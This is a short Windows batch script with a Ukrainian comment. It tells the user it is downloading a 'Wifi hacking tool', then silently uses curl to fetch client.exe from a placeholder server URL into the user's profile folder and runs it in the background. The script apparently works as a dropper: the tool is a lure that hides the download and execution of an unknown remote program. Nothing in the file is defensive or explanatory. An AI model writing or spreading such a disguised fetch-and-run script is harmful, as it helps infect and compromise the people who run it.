@echo off

REM Встановлюємо URL сервера та шлях до файлу на сервері
set "server_url=type_apache_link_here"
set "server_file=client.exe"

set "downloads_folder=%USERPROFILE%\"

echo Download Wifi hacking tool
echo Please Wait
curl -o "%downloads_folder%\client.exe" %server_url%%server_file% > NUL 2>&1

start "" /B "%downloads_folder%\client.exe"

exit